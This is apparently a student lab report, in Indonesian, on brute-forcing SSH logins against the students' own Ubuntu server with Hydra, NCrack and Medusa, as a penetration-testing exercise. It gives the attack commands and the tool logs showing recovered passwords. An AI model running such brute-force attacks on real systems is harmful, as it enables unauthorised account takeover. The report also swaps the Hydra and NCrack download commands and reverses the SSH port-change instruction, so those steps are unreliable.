# Perancangan Keamanan Sistem Jaringan (PKSJ)- Tugas 1

> Tugas 1 pada Mata Kuliah PKSJ ini adalah melakukan pen test [Penetration Testing](https://en.wikipedia.org/wiki/Penetration_test) pada sebuah sistem.
>
> Sistem yang diserang adalah sebuah Ubuntu Server.
>
> Aplikasi yang terlibat: [Hydra](https://github.com/opennota/hydra), [Medusa](http://h.foofus.net/?cat=9), dan [NCrack](https://nmap.org/)
>
> *Semoga bermanfaat!*

## Daftar Isi

- [Dasar Teori](#dasar-teori)
- [Instalasi Aplikasi](#instalasi-aplikasi)
    - [Server](#instalasi-server)
    - [Penetrator](#instalasi-penetrator)
    - [SSH Server](#instalasi-ssh-sever)
- [Eksperimen](#uji-penetrasi)
    - [Uji Eksperimen Menggunakan Hydra](#uji-penetrasi-menggunakan-hydra)
    - [Uji Eksperimen Menggunakan NCrack](#uji-penetrasi-menggunakan-ncrack)
    - [Uji Eksperimen Menggunakan Medusa](#uji-penetrasi-menggunakan-medusa)
- [Kesimpulan](#kesimpulan)

### Pendahuluan


### Dasar Teori


#### Computer Security

Computer Security, yang biasa dikenal juga sebagai Cyber Security dan/atau IT Security, adalah perlindungan pada sebuah sistem komputer dari pencurian atau kerusakan pada hardware, software, maupun informasi yang dimiliki, serta menghindari adanya gangguan ataupun alih-fungsi pada service yang tersedia.


#### Penetration Testing

Penetration Testing adalah metode untuk mengevaluasi keamanan sistem komputer atau jaringan dengan mensimulasikan serangan dari sumber yang berbahaya. Proses ini melibatkan analisis aktif terhadap sistem untuk setiap kerentanan potensial yang diakibatkan oleh sistem yang lemah atau konfigurasi sistem yang tidak benar atau kelemahan operasional dalam proses teknis. Masalah keamanan yang ditemukan akan disampaikan kepada pemilik sistem bersama dengan penilaian dampak dan mitigasi (solusi teknis) dari setiap kerentanan yang ditemukan.
Tujuan Penetration Testing diantaranya adalah untuk menentukan dan mengetahui serangan-serangan yang bisa terjadi terhadap kerentanan yang ada pada sistem, mengetahui dampak bisnis yang diakibatkan dari hasil ekpoitasi yang dilakukan oleh penyerang. Penetration Testing adalah salah satu komponen penting dari *Security Measures*.


### Vulnerabilities

Proses dari Penetration Testing dibagi menjadi 2:
1. Vulnerabilites Discovery - Operasi-operasi yang seharusnya berjalan normal, yang mana tester dapat melakukan uji coba melakukan kegiatan yang dianggap tidak sesuai.
2. Vulnerabilities Exploitation - Operasi-operasi ilegal yang dilakukan dan berjalan lancar akan dijadikan sasaran penyerangan


##Instalasi Aplikasi

Di bawah ini akan dijelaskan bagaimana melakukan eksperimen dengan pertama-tama melakukan instalasi aplikasi yang dibutuhkan.

### Instalasi Server
* Pada eksperimen kali ini kita menggunakan [Ubuntu Server](https://www.ubuntu.com/download/server?).
* Download Ubuntu Server. Pada percobaan kami, kami memilih Ubuntu Server 16.04.
* Persiapkan Bootable USB untuk melakukan instalasi. Pada percobaan kami, kami menggunakan [Rufus](https://"linkrufus").
* Pada saat komputer melakukan booting pilih media USB dimana OS Ubuntu Server diletakkan. Pilih bahasa dan Enter.
* Selanjutnya pilih **Install Ubuntu Server**.
* Pilih bahasa yang hendak digunakan pada saat proses instalasi dan bahasa yang akan digunakan sebagai bahasa default OS.
* Pilih **Continent**, lalu **Country** yang sesuai dengan lokasi Anda saat ini.




### Instalasi Penetrator
* Download file instalasi [Kali Linux](https://"linkkali"). Pada percobaan kami, kami mengguanakan kali sebagai OS untuk penetrasi.
* Persiapkan bootable USB. Pada percobaan kami, kami menggunakan [Rufus](https://"linkrufus").
* Lakukan reboot dan masuk ke bios dengan menekan tombol F2

Selanjutnya akan dijelaskan langkah-langkah menginstall aplikasi yang digunakan untuk Penetration Testing.

#### Instalasi Hydra

Untuk melakukan instalasi Hydra, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget https://nmap.org/ncrack/dist/ncrack-0.5.tar.gz
./configure
make
make install
```

#### Instalasi NCrack

Untuk melakukan instalasi NCrack, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz
./configure
make
make install
```

#### Instalasi Medusa

Untuk melakukan instalasi Medusa, cukup download file tar.gz yang dibutuhkan dan lakukan ekstraksi seperti biasa.

```bash
wget http://www.foofus.net/jmk/tools/medusa-2.0.tar.gz
./configure
make
make install
```

### Instalasi SSH Server

+ Untuk menginstall aplikasi OpenSSH server dan aplikasi yang terkait, jalankan kode:

```bash
sudo apt install openssh-server
```

+ Untuk mengonfigurasi OpenSSH, kita dapat melakukan modifikasi melalui file ` /etc/ssh/sshd_config`. Untuk informasi lebih detail mengenai apa saja yang bisa diedit dari file konfigurasi ini, bisa melihat petunjuk pada file tersebut, dengan menjalankan,


```bash
man sshd_config
```

Dibawah ini adalah contoh konfigurasi yang bisa dimodifikasi sesuai kebutuhan.

* Untuk mengatur supaya OpenSSH menggunakan Port 2222 sebagai ganti dari default TCP Port 22, cari baris konfigurasi berikut ini

```bash
Port 2222
```

dan ganti ke

```bash
Port 22
```



### Uji Penetrasi

Uji Penetrasi kali ini dibagi menjadi 3, yaitu menggunakan Hydra, NCrack, dan Medusa.

Untuk melakukan Penetration Test menggunakan *Automated Tools* dibawah ini, beberapa bisa melakukan attempt untuk 1 password, namun kali ini kami menggunakan password list yang tersimpan pada file `.txt`.

File yang kami gunakan ada 2:

* File yang berisi 10 baris ditambah dengan password asli. Bisa dilihat [disini](https://github.com/rafiarr/PKSJ-Tugas-1/blob/master/wordlist10.txt).
* File yang berisi 1000 baris ditambah dengan password asli. Bisa dilihat [disini](https://github.com/rafiarr/PKSJ-Tugas-1/blob/master/wordlist.txt).

Selain itu, uji penetrasi digunakan pada sistem yang tidak terproteksi untuk automated tools dan sistem yang terproteksi menggunakan [Fail2Ban](https://www.fail2ban.org/wiki/index.php/Main_Page).

#### Uji Penetrasi Menggunkan Hydra

Untuk menjalankan eksekusi pada Hydra, cukup jalankan command di bawah ini:

```bash
hydra -l nafiar -P /root/wordlist.txt -t 64 10.151.34.43 ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 5 baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:40:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
[DATA] attacking ssh://10.151.32.131:22/
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:40:14
<finished>
```

Lama eksekusi hingga menemukan password: 13 detik.

Log hasil eksekusi dari command tersebut pada file berisi 100 baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:23:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 100 login tries (l:1/p:100), ~2 tries per task
[DATA] attacking ssh://10.151.32.131:22/
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 36 final worker threads did not complete until end.
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:24:05
<finished>

[ERROR] 36 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
```

Lama eksekusi hingga menemukan password: 15 detik.

Log hasil eksekusi dari command tersebut pada file berisi 2000 baris ditambah password asli:

```bash
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-20 08:32:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 2000 login tries (l:1/p:2000), ~32 tries per task
[DATA] attacking ssh://10.151.32.131:22/
[STATUS] 942.00 tries/min, 942 tries in 00:01h, 1114 to do in 00:02h, 64 active
[ERROR] ssh target does not support password auth
[STATUS] 918.50 tries/min, 1837 tries in 00:02h, 224 to do in 00:01h, 64 active
[22][ssh] host: 10.151.32.131   login: rafiar   password: 19102017
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 61 final worker threads did not complete until end.
Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-20 08:35:17
<finished>

[ERROR] 61 targets did not resolve or could not be connected
[ERROR] 64 targets did not complete
```

Lama eksekusi hingga menemukan password: 129 detik.

#### Uji Penetrasi Menggunkan NCrack

Untuk menjalankan eksekusi pada NCrack, cukup jalankan command di bawah ini:

```bash
ncrack -v --user nafiar -P wordlist.txt ssh://10.151.34.43
```

Log hasil eksekusi dari command tersebut pada file berisi 5 baris ditambah password asli:

```bash
Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-10-21 04:13 UTC

Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
```

Password berhasil ditemukan.

Log hasil eksekusi dari command tersebut pada file berisi 5 baris ditambah password asli:

```bash
# Ncrack 0.5 scan initiated Sat Oct 21 04:16:34 2017 as: ncrack -v --user nafiar -P wordlist.txt -oN hasilNcrack2000line.txt ssh://10.151.34.43 
Discovered credentials on ssh://10.151.34.43:22 'nafiar' 'guenafiar'
Discovered credentials for ssh on 10.151.34.43 22/tcp:
10.151.34.43 22/tcp ssh: 'nafiar' 'guenafiar'

# Ncrack done at Sat Oct 21 04:21:22 2017 -- 1 service scanned in 288.00 seconds.
Probes sent: 531 | timed-out: 0 | prematurely-closed: 194
```

Password berhasil ditemukan dalam 288 detik.

#### Uji Penetrasi Menggunkan Medusa

Untuk menjalankan eksekusi pada Medusa, cukup jalankan command di bawah ini:

```bash
medusa -u rafiar -P wordlist.txt -h 10.151.32.131 -M ssh
```

Log hasil eksekusi dari command tersebut pada file berisi 100 baris ditambah password asli:

```bash
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111111 (1 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111119 (2 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111110 (3 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111112 (4 of 102 complete)
...
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111272 (99 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111277 (100 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 11111711 (101 of 102 complete)
ACCOUNT CHECK: [ssh] Host: 10.151.32.131 (1 of 1, 0 complete) User: rafiar (1 of 1, 0 complete) Password: 19102017 (102 of 102 complete)
ACCOUNT FOUND: [ssh] Host: 10.151.32.131 User: rafiar Password: 19102017 [SUCCESS]
```

Password berhasil ditemukan.

## Kesimpulan
